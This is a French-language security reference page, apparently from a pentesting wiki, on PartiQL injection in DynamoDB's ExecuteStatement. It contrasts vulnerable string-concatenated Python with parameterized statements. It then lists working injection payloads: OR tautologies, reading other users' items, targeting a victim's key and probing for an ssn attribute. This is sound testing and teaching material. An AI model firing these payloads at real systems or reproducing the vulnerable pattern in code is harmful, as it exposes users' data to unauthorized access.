---
order: 1
title: "Injection PartiQL DynamoDB : sortir de la concaténation de chaînes d'ExecuteStatement"
description: "Les instructions PartiQL exécutées via ExecuteStatement et construites par concaténation de chaînes sont injectables comme du SQL : sortir de la valeur du WHERE, élargir avec OR et lire d'autres items."
keywords:
  - injection PartiQL
  - DynamoDB
  - ExecuteStatement
  - injection de clause WHERE
  - injection NoSQL
  - instructions paramétrées
---

# Injection PartiQL

PartiQL est le langage de requête compatible SQL de DynamoDB, exécuté via les API `ExecuteStatement`, `BatchExecuteStatement` et `ExecuteTransaction`. Parce que la syntaxe est de type SQL (`SELECT`, `INSERT`, `UPDATE`, `DELETE`, `WHERE`, `AND`/`OR`), les développeurs venant des bases de données relationnelles construisent les instructions comme ils l'ont toujours fait (avec du formatage de chaînes) et réintroduisent la même classe d'injection. La forme paramétrée utilise des placeholders `?` fournis dans une liste `Parameters` distincte ; l'injection survient lorsque l'entrée est concaténée dans le texte de l'instruction à la place.

## Schéma vulnérable

```python
# user_id and category come from the request
stmt = (
    "SELECT * FROM Orders "
    f"WHERE user_id = '{user_id}' AND category = '{category}'"
)
client.execute_statement(Statement=stmt)
```

La forme sûre garde l'instruction statique et passe les valeurs hors bande :

```python
client.execute_statement(
    Statement="SELECT * FROM Orders WHERE user_id = ? AND category = ?",
    Parameters=[{"S": user_id}, {"S": category}],
)
```

## Exploitation

PartiQL met les littéraux de chaîne entre **guillemets simples** et les identifiants entre guillemets doubles, donc la primitive d'évasion est le guillemet simple, exactement comme en SQL.

**Élargir la portée avec `OR`.** Fermez la valeur contrôlée par l'attaquant, injectez une tautologie, et commentez ou absorbez le prédicat final pour que chaque ligne corresponde :

```
' OR 'a'='a
```

Injecté dans la position `user_id` ci-dessus, l'instruction devient :

```sql
SELECT * FROM Orders WHERE user_id = '' OR 'a'='a' AND category = 'books'
```

Parce que `OR` a une précédence plus faible que `AND`, faire passer le payload par la **dernière** valeur est plus propre, puisqu'il ne laisse pas d'opérateur orphelin :

```
books' OR user_id <> 'x
```

produit `... AND category = 'books' OR user_id <> 'x'`, renvoyant toute la table.

**Lire les items d'autres utilisateurs.** Lorsque le garde est un unique contrôle de propriété, inversez-le pour atteindre les enregistrements de tous les autres :

```
' OR user_id > '
```

**Cibler des items précis par clé.** Si vous connaissez ou pouvez deviner une autre clé de partition, pivotez directement :

```
' OR user_id = 'victim@example.com
```

**Abus d'opérateurs et de fonctions.** PartiQL prend en charge `IN`, `BETWEEN`, `CONTAINS`, `begins_with` et `attribute_exists`/`attribute_not_exists`. Utilisez-les pour élargir la correspondance ou pour sonder la présence d'attributs :

```
' OR attribute_exists(ssn) OR '1'='1
```

**Portée de l'impact.** DynamoDB n'enchaîne pas plusieurs instructions depuis un seul appel `ExecuteStatement` comme le font les requêtes SQL empilées, donc l'injection est confinée à l'instruction unique. Au sein d'un `SELECT`, cela suffit encore à exfiltrer toute la table. Du côté de l'écriture, l'impact est borné : les `UPDATE` et `DELETE` PartiQL doivent identifier un seul item par sa clé primaire complète, donc un `WHERE` élargi est rejeté plutôt que de devenir une modification de masse, et l'attaquant ne peut atteindre que les items dont il peut adresser la clé complète.

Parce que PartiQL est compatible SQL, les payloads booléens et relationnels standard se transfèrent directement ; ajustez les guillemets et les noms d'attributs au schéma de la table cible.

## Outils

- **AWS CLI** : exécuter `aws dynamodb execute-statement` pour tester les payloads d'évasion PartiQL.
- **Burp Repeater** : délivrer les payloads d'évasion par guillemet simple et OR via le paramètre.

## Références

- [AWS DynamoDB: PartiQL for DynamoDB](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/ql-reference.html)
- [AWS DynamoDB: PartiQL parameterized statements](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/ql-reference.parameterized.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
